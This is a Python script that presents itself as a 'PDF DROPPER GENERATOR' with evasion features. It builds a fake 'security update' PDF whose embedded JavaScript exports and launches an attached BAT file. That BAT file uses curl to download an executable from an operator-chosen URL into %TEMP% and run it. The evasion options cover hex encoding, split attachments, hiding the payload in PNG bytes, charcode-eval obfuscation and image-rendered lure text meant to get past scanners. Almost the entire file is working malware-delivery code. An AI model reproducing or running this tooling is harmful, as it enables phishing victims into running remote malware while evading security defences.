import os
import sys
import img2pdf
import base64
import random
import string
import binascii
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter
from reportlab.lib.units import inch
from reportlab.pdfbase import pdfmetrics
from reportlab.pdfbase.ttfonts import TTFont
import argparse
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.text import Text
from rich.theme import Theme
from rich.prompt import Prompt, Confirm
from rich.table import Table
from pypdf import PdfWriter, PdfReader
from PIL import Image, ImageDraw, ImageFont

# Custom theme for MAGXXIC VOT
custom_theme = Theme({
    "info": "cyan",
    "warning": "yellow",
    "error": "bold red",
    "success": "bold green",
    "highlight": "magenta",
})

console = Console(theme=custom_theme)

def print_banner():
    banner = """
    ███╗   ███╗ █████╗  ██████╗ ██╗  ██╗██╗  ██╗██╗ ██████╗    ██╗   ██╗ ██████╗ ████████╗
    ████╗ ████║██╔══██╗██╔════╝ ██║  ██║╚██╗██╔╝██║██╔════╝    ██║   ██║██╔═══██╗╚══██╔══╝
    ██╔████╔██║███████║██║  ███╗███████║ ╚███╔╝ ██║██║         ██║   ██║██║   ██║   ██║
    ██║╚██╔╝██║██╔══██║██║   ██║╚════██║ ██╔██╗ ██║██║         ╚██╗ ██╔╝██║   ██║   ██║
    ██║ ╚═╝ ██║██║  ██║╚██████╔╝     ██║██╔╝ ██╗██║╚██████╗     ╚████╔╝ ╚██████╔╝   ██║
    ╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝      ╚═╝╚═╝  ╚═╝╚═╝ ╚═════╝      ╚═══╝   ╚═════╝    ╚═╝

                                 [bold white]PDF DROPPER GENERATOR v1.2[/]
                                 [bold cyan]ADVANCED EVASION ENGINE ENABLED[/]
    """
    console.print(Panel(Text.from_markup(banner, justify="center"), border_style="highlight"))

def obfuscate_js(js_code):
    """Simple JS obfuscation using character codes."""
    char_codes = [ord(c) for c in js_code]
    return f"eval(String.fromCharCode({','.join(map(str, char_codes))}));"

def create_image_of_text(text_lines, filename):
    """Creates an image from text to evade OCR/Text scanners."""
    img = Image.new('RGB', (800, 1000), color=(255, 255, 255))
    d = ImageDraw.Draw(img)
    try:
        # Try to find a font, fallback to default
        font = ImageFont.load_default()
    except:
        font = None

    y = 100
    for line in text_lines:
        d.text((100, y), line, fill=(0, 0, 0), font=font)
        y += 40
    img.save(filename)

def create_pdf_dropper(payload_url, image_path, output_pdf, evasion_method):
    """
    Creates a PDF dropper with advanced evasion methods.
    """

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        console=console
    ) as progress:

        # 1. Create the BAT file
        task1 = progress.add_task("Preparing payload...", total=1)
        bat_file = "update.bat"
        # Sanitize payload_url to avoid command injection in the BAT file
        safe_url = payload_url.replace('"', '')
        raw_content = f'@echo off\ncurl -s -o "%TEMP%\\payload.exe" "{safe_url}"\nstart "" "%TEMP%\\payload.exe"\nexit\n'

        try:
            with open(bat_file, "w") as f:
                f.write(raw_content)
            progress.update(task1, completed=1)
        except Exception as e:
            console.print(f"[error]Failed to create BAT: {e}[/]")
            return

        # 2. Design Content
        task2 = progress.add_task("Generating document content...", total=1)
        temp_pdf = "temp_content.pdf"
        text_lines = [
            "SECURITY NOTIFICATION",
            "---------------------",
            "A critical update is required for your system.",
            "Please click the button below to authorize the installation.",
            "",
            "Verified by: MAGXXIC Security Systems"
        ]

        try:
            # We always use ReportLab to get the button and JS trigger right
            # If Image-Based, we'll draw text as image but still need the PDF overlay for the button
            c = canvas.Canvas(temp_pdf, pagesize=letter)

            if evasion_method == "Image-Based PDF":
                create_image_of_text(text_lines, "temp_text.png")
                c.drawImage("temp_text.png", 0, 0, width=letter[0], height=letter[1])
                os.remove("temp_text.png")
            else:
                c.setFont('Helvetica-Bold', 20)
                c.drawString(inch, letter[1] - inch, "SECURITY NOTIFICATION")
                c.setFont('Helvetica', 12)
                y = letter[1] - 2*inch
                for line in text_lines[2:]:
                    c.drawString(inch, y, line)
                    y -= 0.3*inch

            # Button (always added)
            btn_y = 5*inch
            c.setFillColorRGB(0.1, 0.4, 0.8)
            c.roundRect(inch, btn_y, 2*inch, 0.5*inch, 0.1*inch, fill=1)
            c.setFillColorRGB(1, 1, 1)
            c.drawCentredString(2*inch, btn_y + 0.2*inch, "Update Now")

            # Unified JS Trigger logic - will be added via writer for evasion methods
            # but we can add a basic one here for 'None' or 'Obfuscated'

            c.save()
            progress.update(task2, completed=1)
        except Exception as e:
            console.print(f"[error]Content generation failed: {e}[/]")
            return

        # 3. Finalize with evasion
        task3 = progress.add_task(f"Applying {evasion_method}...", total=1)
        try:
            writer = PdfWriter()
            base_reader = PdfReader(temp_pdf)
            for page in base_reader.pages:
                writer.add_page(page)

            # Attachment Logic
            if evasion_method == "Hex Encoding":
                with open(bat_file, "rb") as f:
                    hex_data = binascii.hexlify(f.read())
                writer.add_attachment("update.dat", hex_data)
                # Correct Acrobat JS to handle Stream data correctly
                js_payload = 'try { var d = this.getDataObjectContents("update.dat"); var h = util.stringFromStream(d); var s = ""; for(var i=0; i<h.length; i+=2){ s += String.fromCharCode(parseInt(h.substr(i,2),16)); } this.createDataObject("update.bat", s); this.exportDataObject({cName:"update.bat", nLaunch:2}); } catch(e) {}'

            elif evasion_method == "Split and Merge":
                with open(bat_file, "rb") as f:
                    data = f.read()
                mid = len(data)//2
                writer.add_attachment("p1.bin", data[:mid])
                writer.add_attachment("p2.bin", data[mid:])
                js_payload = 'try { var d1 = util.stringFromStream(this.getDataObjectContents("p1.bin")); var d2 = util.stringFromStream(this.getDataObjectContents("p2.bin")); this.createDataObject("update.bat", d1+d2); this.exportDataObject({cName:"update.bat", nLaunch:2}); } catch(e) {}'

            elif evasion_method == "Steganography":
                # Hide in image bytes
                dummy_img = Image.new('RGB', (10, 10), color=(0,0,0))
                dummy_img.save("logo.png")
                with open(bat_file, "rb") as f_payload:
                    payload_bytes = f_payload.read()
                with open("logo.png", "ab") as f:
                    f.write(b"!!START!!" + payload_bytes + b"!!END!!")

                with open("logo.png", "rb") as f:
                    writer.add_attachment("logo.png", f.read())

                # JS to extract from stream
                js_payload = 'try { var s = util.stringFromStream(this.getDataObjectContents("logo.png")); var i1 = s.indexOf("!!START!!"); var i2 = s.indexOf("!!END!!"); if(i1!=-1 && i2!=-1){ var p = s.substring(i1+9, i2); this.createDataObject("update.bat", p); this.exportDataObject({cName:"update.bat", nLaunch:2}); } } catch(e) {}'
                os.remove("logo.png")

            else: # None, Obfuscated JS, Image-Based
                with open(bat_file, "rb") as f:
                    writer.add_attachment("update.bat", f.read())
                js_payload = 'this.exportDataObject({ cName: "update.bat", nLaunch: 2 });'

            if evasion_method == "Obfuscated JavaScript":
                js_payload = obfuscate_js(js_payload)

            writer.add_js(js_payload)

            # Add Link annotation for the button
            # Coordinates from canvas: (inch, 5*inch, 3*inch, 5.5*inch)
            # pypdf uses different coordinate system or we just use Annotation?
            # For simplicity, we'll just rely on the auto-launch and document-level JS for now,
            # but we can try to add a Link annotation if pypdf supports it easily.

            with open(output_pdf, "wb") as f:
                writer.write(f)

            progress.update(task3, completed=1)
        except Exception as e:
            console.print(f"[error]Evasion failed: {e}[/]")
            return

        # 4. Cleanup
        finally:
            task4 = progress.add_task("Cleaning up...", total=1)
            for f in [bat_file, temp_pdf]:
                if os.path.exists(f): os.remove(f)
            progress.update(task4, completed=1)

    console.print(Panel(f"[success]GENERATION COMPLETE[/]\nFile: [highlight]{output_pdf}[/]\nMethod: [highlight]{evasion_method}[/]", border_style="success"))

def main():
    print_banner()

    payload_url = Prompt.ask("[info]Payload URL[/]", default="http://example.com/payload.exe")
    output_pdf = Prompt.ask("[info]Output Filename[/]", default="Update.pdf")
    if not output_pdf.endswith(".pdf"): output_pdf += ".pdf"

    methods = ["Image-Based PDF", "Split and Merge", "Obfuscated JavaScript", "Hex Encoding", "Steganography", "None"]
    table = Table(title="Evasion Methods")
    table.add_column("ID", style="cyan")
    table.add_column("Method", style="magenta")
    for i, m in enumerate(methods, 1):
        table.add_row(str(i), m)
    console.print(table)

    choice = Prompt.ask("[info]Select Evasion Method[/]", choices=[str(i) for i in range(1, len(methods)+1)], default="3")
    evasion_method = methods[int(choice)-1]

    if Confirm.ask("[success]Start Generation?[/]", default=True):
        create_pdf_dropper(payload_url, None, output_pdf, evasion_method)

if __name__ == "__main__":
    main()
